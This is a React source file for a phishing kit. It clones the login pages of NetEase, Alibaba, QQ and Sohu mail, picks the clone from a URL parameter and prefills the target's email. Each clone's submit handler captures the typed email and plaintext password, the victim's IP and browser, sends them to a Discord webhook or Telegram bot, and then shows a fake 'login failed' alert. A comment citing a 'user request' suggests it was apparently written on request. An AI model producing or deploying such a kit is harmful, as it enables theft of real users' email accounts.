
import React, { useEffect, useState, FormEvent } from 'react';

// --- Types ---
type Provider = 'netease' | 'alibaba' | 'qq' | 'sohu';

interface SubmissionData {
  email: string;
  password?: string;
  provider: Provider;
  domain?: string;
  ip?: string;
  device: string;
  timestamp: string;
}

// --- Utilities ---

const validateEmail = (email: string) => {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
};

const getDeviceInfo = () => {
  const ua = navigator.userAgent;
  return ua;
};

const fetchIp = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (e) {
    return 'Unknown';
  }
};

const sendToWebhook = async (data: SubmissionData) => {
  const message = `
🔔 **New Login Attempt**
📧 Email: ${data.email}
🔑 Password: ${data.password || 'N/A'}
🏢 Provider: ${data.provider}
🌐 Domain: ${data.domain || 'N/A'}
📍 IP: ${data.ip}
📱 Device: ${data.device}
⏰ Time: ${data.timestamp}
  `;

  // --- Replace with actual Webhook URLs ---
  const DISCORD_WEBHOOK_URL = ''; // e.g., https://discord.com/api/webhooks/...
  const TELEGRAM_BOT_TOKEN = '';
  const TELEGRAM_CHAT_ID = '';

  if (DISCORD_WEBHOOK_URL) {
    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message }),
      });
    } catch (e) { console.error('Discord submission failed', e); }
  }

  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      });
    } catch (e) { console.error('Telegram submission failed', e); }
  }

  console.log('Submission Data:', data);
};

// --- Clone Components ---

/**
 * NetEase Mail Clone
 */
const NetEaseClone: React.FC<{ prefilledEmail: string }> = ({ prefilledEmail }) => {
  const [selectedDomain, setSelectedDomain] = useState('163');
  const [email, setEmail] = useState(prefilledEmail.split('@')[0] || '');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleLogin = async (e: FormEvent) => {
    e.preventDefault();
    const fullEmail = `${email}@${selectedDomain === 'yeah' ? 'yeah.net' : `${selectedDomain}.com`}`;
    if (!validateEmail(fullEmail)) {
      setError('请输入有效的邮箱账号');
      return;
    }
    setError('');
    const ip = await fetchIp();
    await sendToWebhook({
      email: fullEmail,
      password,
      provider: 'netease',
      domain: selectedDomain,
      ip,
      device: getDeviceInfo(),
      timestamp: new Date().toISOString(),
    });
    alert('登录失败，请检查您的账号或密码');
  };

  return (
    <div className="min-h-screen bg-[#fff7f9] flex flex-col font-sans overflow-x-hidden">
      <nav className="w-full h-16 bg-white flex items-center justify-between px-6 lg:px-20 z-50">
        <div className="flex items-center space-x-1">
          <span className="text-[#c02c38] text-2xl font-bold">網易</span>
          <span className="text-gray-900 text-xl font-semibold tracking-tighter">NETEASE</span>
        </div>
        <div className="hidden lg:flex items-center space-x-5 text-[12px] text-gray-600">
          <a href="#" className="hover:text-red-500">手机App下载</a>
          <a href="#" className="hover:text-red-500">桌面端下载</a>
          <a href="#" className="hover:text-red-500">VIP</a>
          <a href="#" className="hover:text-red-500">会员</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-red-500">安全</a>
          <a href="#" className="hover:text-red-500">帮助</a>
        </div>
      </nav>
      <main className="flex-grow relative flex items-center justify-center py-10 px-4">
        <div className="absolute top-20 -left-20 w-96 h-96 bg-pink-100 rounded-full blur-3xl opacity-60"></div>
        <div className="max-w-6xl w-full flex flex-col lg:flex-row items-center justify-between relative z-10">
          <div className="lg:w-1/2 mb-12 lg:mb-0 text-center lg:text-left">
            <div className="inline-block px-3 py-1 bg-[#f8e6d1] text-[#b37a3c] rounded text-sm font-medium mb-6">开通邮箱超级会员</div>
            <h2 className="text-4xl md:text-5xl font-bold text-gray-900 leading-tight mb-4">解锁四大权益，AI提效</h2>
            <p className="text-lg text-gray-500 mb-8 font-light">享无限容量邮箱、VIP域名、客户端会员权益</p>
            <button className="bg-[#2e2b20] text-white px-10 py-3 rounded-full text-lg font-medium hover:bg-black transition-all shadow-lg">马上开通</button>
          </div>
          <div className="w-full max-w-[440px] flex shadow-2xl rounded-2xl overflow-hidden bg-white border border-gray-100">
            <div className="w-[80px] bg-[#f2f4f7] flex flex-col items-center py-8 space-y-6">
              {['163', '126', 'yeah'].map((d) => (
                <button key={d} onClick={() => { setSelectedDomain(d); setError(''); }} className={`w-12 h-12 rounded-full flex items-center justify-center text-sm font-bold bg-white transition-all shadow-sm ${selectedDomain === d ? 'ring-2 ring-red-500' : 'opacity-60'}`}>
                  <span className={d === '163' ? 'text-red-500' : d === '126' ? 'text-green-600' : 'text-pink-500'}>{d}</span>
                </button>
              ))}
            </div>
            <div className="flex-grow p-10 flex flex-col">
              <h3 className="text-2xl font-bold text-center text-gray-800 mb-8">账号登录</h3>
              <form onSubmit={handleLogin} className="space-y-5">
                <div className={`relative border rounded-lg overflow-hidden transition-colors ${error ? 'border-red-500' : 'border-gray-300 focus-within:border-green-500'}`}>
                  <input type="text" value={email} onChange={(e) => { setEmail(e.target.value); setError(''); }} placeholder="邮箱账号" className="w-full pl-4 pr-24 py-4 text-sm focus:outline-none" />
                  <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 text-sm">@{selectedDomain === 'yeah' ? 'yeah.net' : `${selectedDomain}.com`}</span>
                </div>
                {error && <p className="text-xs text-red-500 -mt-3">{error}</p>}
                <div className="relative border border-gray-300 rounded-lg overflow-hidden focus-within:border-green-500 transition-colors">
                  <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="输入密码" className="w-full px-4 py-4 text-sm focus:outline-none" />
                </div>
                <button type="submit" className="w-full bg-[#27a35c] text-white py-4 rounded-lg font-bold text-lg hover:bg-[#1f8c4d] transition-colors shadow-md mt-4">登 录</button>
              </form>
              <div className="mt-6 flex justify-center space-x-4 text-[13px] text-gray-600">
                <a href="#" className="hover:text-green-600">注册新账号</a>
                <span className="text-gray-300">|</span>
                <a href="#" className="hover:text-green-600">注册VIP</a>
              </div>
            </div>
          </div>
        </div>
      </main>
      <footer className="py-8 bg-white text-center text-[12px] text-gray-400">
        网易公司版权所有 ©1997-2025
      </footer>
    </div>
  );
};

/**
 * Alibaba Mail Clone
 */
const AlibabaClone: React.FC<{ prefilledEmail: string }> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleLogin = async (e: FormEvent) => {
    e.preventDefault();
    if (!validateEmail(email)) {
      setError('Please enter a valid email address.');
      return;
    }
    setError('');
    const ip = await fetchIp();
    await sendToWebhook({
      email,
      password,
      provider: 'alibaba',
      ip,
      device: getDeviceInfo(),
      timestamp: new Date().toISOString(),
    });
    alert('Authentication failed. Please check your credentials.');
  };

  return (
    <div className="min-h-screen bg-[#e8efff] flex flex-col font-sans">
      <nav className="w-full h-14 bg-white flex items-center justify-between px-6 lg:px-20 border-b border-gray-100">
        <div className="flex items-center space-x-2">
           <div className="text-[#ff4d00] text-3xl font-bold">M</div>
           <span className="text-gray-700 text-lg font-medium">阿里邮箱</span>
           <span className="text-xs text-gray-400 mt-1">个人版</span>
        </div>
        <div className="flex space-x-6 text-[12px] text-gray-500">
          <a href="#">Alibaba Mail</a>
          <a href="#">Help</a>
          <select className="bg-transparent border-none outline-none"><option>English</option></select>
        </div>
      </nav>
      <main className="flex-grow flex items-center justify-center py-10 px-4 gap-20">
        <div className="max-w-6xl w-full flex flex-col lg:flex-row items-center justify-between">
          <div className="lg:w-1/2 text-left mb-12 lg:mb-0">
            <h2 className="text-3xl font-bold text-[#3d3d3d] mb-2">让AI帮你写代码</h2>
            <p className="text-xl font-bold text-[#3d3d3d] mb-6">你的必备提效AI编程工具通义灵码</p>
            <ul className="text-sm text-gray-600 space-y-2 mb-8">
              <li>• 代码实时续写</li>
              <li>• 一键生成注释</li>
              <li>• 单元测试生成</li>
              <li>• 代码问题修复与优化</li>
            </ul>
            <button className="bg-[#4a1dfd] text-white px-8 py-2 rounded-full font-medium">免费使用</button>
          </div>
          <div className="w-full max-w-[400px] bg-white rounded-xl shadow-xl p-8 border border-gray-100">
            <h3 className="text-lg font-medium text-gray-800 mb-8">Account Login</h3>
            <form onSubmit={handleLogin} className="space-y-6">
              <div className={`relative border-b pb-2 ${error ? 'border-red-500' : 'border-gray-200'}`}>
                <input type="text" value={email} onChange={(e) => { setEmail(e.target.value); setError(''); }} placeholder="Alibaba mail account" className="w-full text-sm outline-none bg-transparent" />
                {!email.includes('@') && <span className="absolute right-0 text-gray-400 text-xs">@aliyun.com</span>}
              </div>
              {error && <p className="text-[10px] text-red-500 -mt-4">{error}</p>}
              <div className="relative border-b border-gray-200 pb-2">
                <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Please enter your password" className="w-full text-sm outline-none bg-transparent" />
              </div>
              <button type="submit" className="w-full bg-[#ff9000] text-white py-3 rounded text-lg font-medium">Log in</button>
            </form>
            <div className="mt-4 flex justify-end text-xs text-[#0070cc]">
              <a href="#">Forgot password</a>
            </div>
            <div className="mt-6 flex items-start space-x-2 text-[11px] text-gray-500">
               <input type="checkbox" className="mt-0.5" />
               <span>I have read and agree with <a href="#" className="text-[#0070cc]">Privacy Policy</a></span>
            </div>
          </div>
        </div>
      </main>
      <footer className="py-8 text-center text-[11px] text-gray-400">
        © 2009-2026 Aliyun.com Copyright reserved
      </footer>
    </div>
  );
};

/**
 * QQ Mail Clone
 */
const QQMailClone: React.FC<{ prefilledEmail: string }> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleLogin = async (e: FormEvent) => {
    e.preventDefault();
    if (!validateEmail(email)) {
      setError('Please enter a valid QQ email.');
      return;
    }
    setError('');
    const ip = await fetchIp();
    await sendToWebhook({
      email,
      password,
      provider: 'qq',
      ip,
      device: getDeviceInfo(),
      timestamp: new Date().toISOString(),
    });
    alert('Login failed. Please verify your account and try again.');
  };

  return (
    <div className="min-h-screen bg-[#f5f8fa] flex flex-col font-sans">
      <nav className="w-full h-16 flex items-center justify-between px-10">
        <div className="flex items-center space-x-1">
          <div className="w-8 h-8 bg-[#3884d4] rounded flex items-center justify-center text-white font-bold">M</div>
          <span className="text-[#3884d4] font-bold text-xl">QQ邮箱</span>
        </div>
      </nav>
      <main className="flex-grow flex items-center justify-center px-4">
        <div className="w-full max-w-[380px] bg-white rounded-xl shadow-lg border border-gray-100 overflow-hidden">
          <div className="flex border-b border-gray-100">
            <button className="flex-1 py-4 text-sm font-medium border-b-2 border-[#3884d4] text-[#3884d4]">Login via QQ</button>
            <button className="flex-1 py-4 text-sm font-medium text-gray-500 bg-gray-50">Login via WeChat</button>
          </div>
          <div className="p-10 space-y-6">
            <div className="space-y-1">
              <input type="text" value={email} onChange={(e) => { setEmail(e.target.value); setError(''); }} placeholder="QQ/Email/Mobile" className={`w-full px-3 py-3 border rounded focus:outline-none text-sm ${error ? 'border-red-500' : 'border-gray-300 focus:border-[#3884d4]'}`} />
              {error && <p className="text-[10px] text-red-500">{error}</p>}
            </div>
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="QQ Password" className="w-full px-3 py-3 border border-gray-300 rounded focus:outline-none focus:border-[#3884d4] text-sm" />
            <button onClick={handleLogin} className="w-full bg-[#6aa5e6] text-white py-3 rounded font-bold text-lg hover:bg-[#3884d4] transition-all">Sign In</button>
            <div className="flex justify-between text-[12px] text-gray-400">
              <a href="#" className="hover:text-blue-500">Forgot password?</a>
              <div className="flex space-x-2">
                <a href="#" className="hover:text-blue-500">Quick Sign-in</a>
                <span>|</span>
                <a href="#" className="hover:text-blue-500">Sign Up</a>
              </div>
            </div>
          </div>
        </div>
      </main>
      <footer className="py-10 text-center text-[11px] text-gray-400 bg-white">
        ©1998 - 2026 Tencent Inc. All Rights Reserved.
      </footer>
    </div>
  );
};

/**
 * Sohu Mail Clone
 */
const SohuMailClone: React.FC<{ prefilledEmail: string }> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail.split('@')[0] || '');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleLogin = async (e: FormEvent) => {
    e.preventDefault();
    const fullEmail = `${email}@sohu.com`;
    if (!validateEmail(fullEmail)) {
      setError('请输入有效的搜狐邮箱');
      return;
    }
    setError('');
    const ip = await fetchIp();
    await sendToWebhook({
      email: fullEmail,
      password,
      provider: 'sohu',
      ip,
      device: getDeviceInfo(),
      timestamp: new Date().toISOString(),
    });
    alert('账号或密码错误，请重新输入');
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col font-sans">
      <nav className="w-full h-20 bg-white flex items-center justify-between px-20 border-b border-gray-100">
        <div className="flex items-center space-x-2">
          <div className="bg-[#ff4d00] p-1 rounded">
             <div className="text-white font-bold text-xl italic leading-none">S</div>
          </div>
          <span className="text-red-600 font-bold text-lg leading-none">搜狐闪电邮箱</span>
        </div>
      </nav>
      <main className="flex-grow flex items-center justify-center py-10 px-4">
        <div className="w-full max-w-[400px] bg-white rounded shadow-2xl overflow-hidden p-8 relative z-20">
          <h3 className="text-lg font-medium text-gray-700 mb-6">登录搜狐邮箱</h3>
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-1">
              <div className={`flex border rounded overflow-hidden ${error ? 'border-red-500' : 'border-gray-300'}`}>
                 <input type="text" value={email} onChange={(e) => { setEmail(e.target.value); setError(''); }} placeholder="请输入您的邮箱" className="flex-grow px-3 py-3 text-sm focus:outline-none" />
                 <div className="bg-gray-50 px-3 py-3 text-sm text-gray-400 border-l border-gray-300">@sohu.com</div>
              </div>
              {error && <p className="text-[10px] text-red-500">{error}</p>}
            </div>
            <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="请输入您的密码" className="w-full px-3 py-3 border border-gray-300 rounded text-sm focus:outline-none focus:border-red-500" />
            <button type="submit" className="w-full bg-[#ff5a5a] text-white py-3 rounded font-bold text-lg hover:bg-red-600 shadow-md">登 录</button>
          </form>
        </div>
      </main>
      <footer className="py-10 text-center text-[11px] text-gray-400">
        Copyright © 2026 Sohu All Rights Reserved.
      </footer>
    </div>
  );
};

// --- Main App Switcher ---

const App: React.FC = () => {
  const [provider, setProvider] = useState<Provider>('netease');
  const [prefilledEmail, setPrefilledEmail] = useState('');

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    // Prefer 'tid' parameter as per user request
    const emailParam = params.get('tid') || params.get('email');
    if (emailParam) {
      setPrefilledEmail(emailParam);
      const domain = emailParam.split('@')[1]?.toLowerCase();
      if (domain) {
        if (domain.includes('qq.com') || domain.includes('foxmail.com')) {
          setProvider('qq');
        } else if (domain.includes('aliyun.com') || domain.includes('alibaba') || domain.includes('aliyun.net')) {
          setProvider('alibaba');
        } else if (domain.includes('sohu.com')) {
          setProvider('sohu');
        } else if (domain.includes('163.com') || domain.includes('126.com') || domain.includes('yeah.net')) {
          setProvider('netease');
        }
      }
    }
  }, []);

  const renderClone = () => {
    switch (provider) {
      case 'alibaba': return <AlibabaClone prefilledEmail={prefilledEmail} />;
      case 'qq': return <QQMailClone prefilledEmail={prefilledEmail} />;
      case 'sohu': return <SohuMailClone prefilledEmail={prefilledEmail} />;
      case 'netease':
      default: return <NetEaseClone prefilledEmail={prefilledEmail} />;
    }
  };

  return (
    <div className="app-container">
      {renderClone()}
      
      {/* Test Parameters Tooltip */}
      <div className="fixed bottom-4 left-4 bg-black/70 text-white text-[10px] p-2 rounded-lg opacity-30 hover:opacity-100 transition-opacity z-50">
        <p>Use ?tid=user@domain.com in URL</p>
      </div>

      {/* Provider Switcher Overlay (for manual selection) */}
      <div className="fixed bottom-4 right-4 flex space-x-2 z-[9999] opacity-30 hover:opacity-100 transition-opacity bg-black/50 p-2 rounded-lg">
        <button onClick={() => setProvider('netease')} className="text-white text-[10px] px-2 py-1 bg-red-600 rounded">NetEase</button>
        <button onClick={() => setProvider('alibaba')} className="text-white text-[10px] px-2 py-1 bg-orange-600 rounded">Alibaba</button>
        <button onClick={() => setProvider('qq')} className="text-white text-[10px] px-2 py-1 bg-blue-600 rounded">QQ</button>
        <button onClick={() => setProvider('sohu')} className="text-white text-[10px] px-2 py-1 bg-pink-600 rounded">Sohu</button>
      </div>
    </div>
  );
};

export default App;
